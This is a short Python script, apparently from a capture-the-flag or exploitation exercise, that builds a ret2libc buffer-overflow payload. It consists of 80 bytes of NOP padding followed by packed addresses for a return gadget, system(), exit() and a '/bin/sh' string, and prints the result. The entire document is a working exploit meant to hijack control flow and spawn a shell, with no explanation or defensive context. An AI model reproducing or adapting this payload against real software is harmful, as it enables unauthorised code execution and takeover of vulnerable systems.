import struct

offset = 80
ret = struct.pack("I", 0x8048383)
binsh = struct.pack("I", 0xb7fb63bf)
system =  struct.pack("I", 0xb7ecffb0)
exit = struct.pack("I", 0xb7ec60c0)
payload = "\x90"*offset + ret + system + exit + binsh
print(payload)
